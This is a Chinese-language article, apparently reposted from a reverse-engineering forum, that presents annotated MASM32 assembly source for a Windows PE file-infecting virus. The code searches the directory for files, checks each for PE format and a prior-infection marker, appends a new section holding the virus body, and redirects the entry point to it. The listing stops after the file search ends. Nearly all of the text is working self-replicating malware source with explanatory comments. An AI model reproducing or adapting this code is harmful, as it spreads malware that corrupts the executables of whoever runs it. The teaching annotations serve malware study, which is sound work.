
# 一个病毒源码的分析

> 原文：[`www.pediy.com/kssd/pediy09/pediy09-332.htm`](https://www.pediy.com/kssd/pediy09/pediy09-332.htm)

```asm
.586  
.model flat, stdcall  
option casemap : none ; 区分大小写  

include \masm32\include\windows.inc  
include \masm32\include\user32.inc  
include \masm32\include\kernel32.inc  
include \masm32\include\gdi32.inc  

includelib \masm32\lib\user32.lib  
includelib \masm32\lib\kernel32.lib  
includelib \masm32\lib\gdi32.lib  

.data ; 寄主程序要用到的数据  
    MsgTitle db "Caution!", 0h  
    Msg db "VirusZ OK!", 0h  

.code  
;==========================================>>宿主程序  
main_start:  
    push MB_OK  
    push offset MsgTitle  
    push offset Msg  
    push NULL  
    call MessageBox  
    push 0h  
    call ExitProcess  
; 这个寄主程序很简单，就不需要解释了吧。：）  
;==========================================<<寄主程序结束  

VirusZ segment  
;==========================================>>病毒代码  
virus_start:  
    call get_offset  
get_offset:  
    pop ebp  
    sub ebp, offset get_offset  
; 取得偏移值，以后所有数据都要加上这个偏移。  
; 这个偏移是怎么取得的呢？call get_offset 将 get_offset 的地址压入堆栈，然后用 pop ebp 把地址值放到 ebp 中，  
; 再用原来的 get_offset 地址减去它，就拿到了原地址和当前地址的偏移。  

    cmp Ori_Entry[ebp], 0h  
    jnz save_entry  
    mov Ori_Entry[ebp], 401000h  
; 什么情况下 Ori_Entry[ebp]中的值会是 0h 呢？只有在运行现在这个程序的时候。  
; 在后面的代码中可以看到，在传染时，被感染的 EXE 中 Ori_Entry[ebp]都被填入了原入口地址，  
; 所以只有这个程序在执行时 Ori_Entry[ebp] 中为 0h。  

save_entry:  
    push Ori_Entry[ebp]  
    pop Ret_Entry[ebp]  
; 因为 Ori_Entry[ebp]在后面写入 EXE 时要改为其他的值，所以，先把本次运行的入口地址保存起来，之后跳转使用。  

    lea eax, FindData[ebp]  
    push eax  
    lea eax, FindFile[ebp]  
    push eax  
    call ZFindFirstFile ; 查找第一个文件  
; 每一个 API 的调用都在前面加上了一个 Z，声明在后面的调用函数部分。  
    cmp eax, INVALID_HANDLE_VALUE  
    jz end_find ; 查找完毕  
    mov FindHandle[ebp], eax  
    call infect_file ; 感染文件  
    
find_next:  
    lea eax, FindData[ebp]  
    push eax  
    push FindHandle[ebp]  
    call ZFindNextFile ; 查找下一个文件  
    cmp eax, FALSE  
    jz end_find ; 查找完毕  
    call infect_file ; 感染文件  
    jmp find_next  

infect_file:  
; 下面开始是感染判断及感染过程。  
    push 0h  
    push FILE_ATTRIBUTE_NORMAL  
    push OPEN_EXISTING  
    push 0h  
    push FILE_SHARE_READ + FILE_SHARE_WRITE  
    push GENERIC_READ + GENERIC_WRITE  
    lea eax, FindData[ebp].cFileName  
    push eax  
    call ZCreateFile ; 打开文件  
    cmp eax, INVALID_HANDLE_VALUE  
    jz create_err  
    mov OpenHandle[ebp], eax  

    push FILE_BEGIN  
    push 0h  
    push 3ch  
    push OpenHandle[ebp]  
    call ZSetFilePointer ; 指向文件 3ch 处  
; 从文件开始数起的 3ch 处是 MZ Header 中记录的 PE 头的偏移。  

    push 0h  
    lea eax, ReadCount[ebp]  
    push eax  
    push 4h  
    lea eax, PEAddress[ebp]  
    push eax  
    push OpenHandle[ebp]  
    call ZReadFile ; 读取 PE 头偏移  
    cmp eax, 0h  
    jz read_err  

    push FILE_BEGIN  
    push 0h  
    push PEAddress[ebp]  
    push OpenHandle[ebp]  
    call ZSetFilePointer ; 指向 PE 头开始处  

    mov HeadLength[ebp], sizeof PEHead + sizeof SectionTable  
; HeadLength[ebp]中是 PE 头和节表的长度和。  
    push 0h  
    lea eax, ReadCount[ebp]  
    push eax  
    push HeadLength[ebp]  
    lea eax, PEHead[ebp]  
    push eax  
    push OpenHandle[ebp]  
    call ZReadFile ; 读取 PE 头和节表  
    cmp eax, 0h  
    jz read_err  

    cmp DWORD ptr PEHead[ebp].Signature, IMAGE_NT_SIGNATURE ; 是否 PE 格式  
; IMAGE_NT_SIGNATURE 应为"PE\0\0"。  
    jnz end_modify  

    cmp WORD ptr PEHead[ebp + 1ah], 0C05h ; 是否已经感染  
; PEHead[ebp + 1ah]处的值代表的是该程序的 Linker 的版本，在 MASM32 V8.0 中版本为 0C05h，  
; 而绝大多数程序，这个值是不相等的，所以用来判断是否感染。  
    jz end_modify  

; 下面是感染 EXE 的代码  
    mov eax, PEHead[ebp].OptionalHeader.AddressOfEntryPoint  
; PEHead[ebp].OptionalHeader.AddressOfEntryPoint 是程序入口地址的 RVA。  
    add eax, PEHead[ebp].OptionalHeader.ImageBase  
; PEHead[ebp].OptionalHeader.ImageBase 是程序载入内存的基地址。  
; 两个值相加得到程序入口的实际地址。  
    mov Ori_Entry[ebp], eax ; 保存原程序入口点  

    mov eax, sizeof PEHead  
    mov SectionAddress[ebp], eax ; 节表开始地址  
    mov VirusLength[ebp], offset virus_end - offset virus_start ; 病毒长度  

    movzx eax, PEHead[ebp].FileHeader.NumberOfSections ; 节的个数  
    inc eax  
    mov ecx, 28h  
; 节表中每个节定义占 28h。  
    mul ecx ; eax = eax * ecx  
    add eax, SectionAddress[ebp]  
    add eax, PEAddress[ebp]  
    cmp eax, PEHead[ebp].OptionalHeader.SizeOfHeaders ; 看是否还能插入一个节  
    ja end_modify  

    lea edi, SectionTable[ebp]  
    movzx eax, PEHead[ebp].FileHeader.NumberOfSections  
    mov ecx, 28h  
    mul ecx  
; eax 中得到节表修改前大小。  
    add edi, eax  
; edi 存放添加节的开始地址。  
    inc PEHead[ebp].FileHeader.NumberOfSections ; 添加一个节  

    mov eax, [edi - 28h + 8h] ; 前一节长  
    add eax, [edi - 28h + 0ch] ; 前一节 RVA  
    mov ecx, PEHead[ebp].OptionalHeader.SectionAlignment ; 节的对齐值  
    div ecx  
    inc eax  
    mul ecx  
    mov NewSection[ebp].VirtualAddress, eax ; 对齐的新节虚拟地址  

    mov eax, VirusLength[ebp] ; 病毒长度  
    mov ecx, PEHead[ebp].OptionalHeader.FileAlignment ; 文件的对齐值  
    div ecx  
    inc eax  
    mul ecx  
    mov NewSection[ebp].RawSize, eax ; 对齐的新节物理大小  

    mov eax, VirusLength[ebp] ; 病毒长度  
    mov NewSection[ebp].VirtualSize, eax ; 新节虚拟长度 = 病毒长度  

    mov eax, [edi - 28h + 14h] ; 前一节物理偏移  
    add eax, [edi - 28h + 10h] ; 前一节物理长度  
    mov ecx, PEHead[ebp].OptionalHeader.FileAlignment ; 文件的对齐值  
    div ecx  
    inc eax  
    mul ecx  
    mov NewSection[ebp].RawOffset, eax ; 对齐的新节物理偏移  

    mov eax, NewSection[ebp].VirtualSize ; 新节虚拟长度  
    add eax, PEHead[ebp].OptionalHeader.SizeOfImage ; 加上原文件虚拟长度  
    mov ecx, PEHead[ebp].OptionalHeader.SectionAlignment ; 节的对齐值  
    div ecx  
    inc eax  
    mul ecx  
    mov PEHead[ebp].OptionalHeader.SizeOfImage, eax ; 新的文件虚拟长度  
; 之前的修改都是在改 NewSection[ebp]中的，别忘了拷回节表中。  

    lea esi, NewSection[ebp]  
    mov ecx, 28h  
    rep movsb ; 从 NewSection 中拷到节表中  

    mov eax, NewSection[ebp].VirtualAddress  
    mov PEHead[ebp].OptionalHeader.AddressOfEntryPoint, eax ; 更新程序入口点  

    mov WORD ptr PEHead[ebp + 1ah], 0C05h ; 加上已感染标志  

    push FILE_BEGIN  
    push 0h  
    push PEAddress[ebp]  
    push OpenHandle[ebp]  
    call ZSetFilePointer ; 文件指针指向 PE 头处  

    push 0h  
    lea eax, ReadCount[ebp]  
    push eax  
    push HeadLength[ebp]  
    lea eax, PEHead[ebp]  
    push eax  
    push OpenHandle[ebp]  
    call ZWriteFile ; 写入新的 PE 头  
    cmp eax, 0h  
    jz write_err  

    push FILE_BEGIN  
    push 0h  
    push NewSection[ebp].RawOffset  
    push OpenHandle[ebp]  
    call ZSetFilePointer ; 指向病毒代码写入处（应该在文件尾）  

    push 0h  
    lea eax, ReadCount[ebp]  
    push eax  
    push NewSection[ebp].RawSize  
    lea eax, virus_start[ebp]  
    push eax  
    push OpenHandle[ebp]  
    call ZWriteFile ; 写入病毒代码  
    cmp eax, 0h  
    jz write_err  

end_modify:  
read_err:  
write_err:  
setpointer_err:  
    push OpenHandle[ebp]  
    call ZCloseHandle ; 关闭文件  
    
create_err:  

    ret  
; 感染完毕，ret 后继续查找下一个文件。  

end_find:  
    push FindHandle[ebp]  
    call ZFindClose ; 停止查找  
```
